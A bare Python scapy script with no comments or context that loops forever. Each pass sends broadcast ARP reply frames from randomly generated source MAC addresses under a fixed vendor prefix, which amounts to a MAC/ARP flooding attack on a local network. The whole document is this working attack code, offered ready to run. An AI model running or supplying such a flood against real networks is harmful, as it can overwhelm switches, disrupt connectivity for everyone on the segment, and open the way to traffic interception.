import scapy.all as scapy

vendor = "b8:e8:56:"
destMAC = "FF:FF:FF:FF:FF:FF"

while True:
    randMAC = vendor + ':'.join(scapy.RandMAC().split(':')[3:])
    print(randMAC)
    scapy.sendp(scapy.Ether(src=randMAC, dst=destMAC)/scapy.ARP(op=2, psrc="0.0.0.0", hwdst=destMAC)/scapy.Padding(load="X"*18), verbose=0)
